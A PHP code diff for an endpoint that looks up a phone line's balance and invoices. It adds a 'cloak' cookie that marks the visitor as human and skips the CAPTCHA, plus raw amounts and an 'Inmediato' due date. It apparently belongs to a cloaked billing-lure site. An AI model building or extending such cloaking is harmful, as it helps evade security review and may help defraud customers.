@@ -50,6 +50,9 @@ try {
     $dbRow = $stmt->fetch(PDO::FETCH_ASSOC);
     
     if ($dbRow) {
+        // Al validar un número existente, se le perdona el CAPTCHA garantizando que "es humano"
+        cloak_set_cookie('is_human', 'true');
+
         $balance = (float)$dbRow['balance'];
         $status = $dbRow['status'];
         $rawData = json_decode($dbRow['raw_data'], true);
@@ -80,7 +83,8 @@ try {
                 $invoices[] = [
                     'line' => $item['targetMsisdn']['formattedValue'] ?? $value,
                     'amount' => $item['dueAmount']['formattedValue'] ?? ("$ " . number_format($amt, 0, ',', '.')),
-                    'dueDate' => $item['dueDate']['formattedValue'] ?? ''
+                    'amountRaw' => (float)$amt,
+                    'dueDate' => $item['dueDate']['formattedValue'] ?? 'Inmediato'
                 ];
             }
         }
@@ -90,6 +94,7 @@ try {
             "status" => ($balance > 0 ? "debt" : "up_to_date"),
             "balance" => "$ " . number_format($balance, 0, ',', '.'),
             "totalBalance" => "$ " . number_format($balance, 0, ',', '.'),
+            "totalBalanceRaw" => (float)$balance,
             "invoices" => $invoices,
             "db_cached" => true,
             "last_sync" => $dbRow['last_sync']
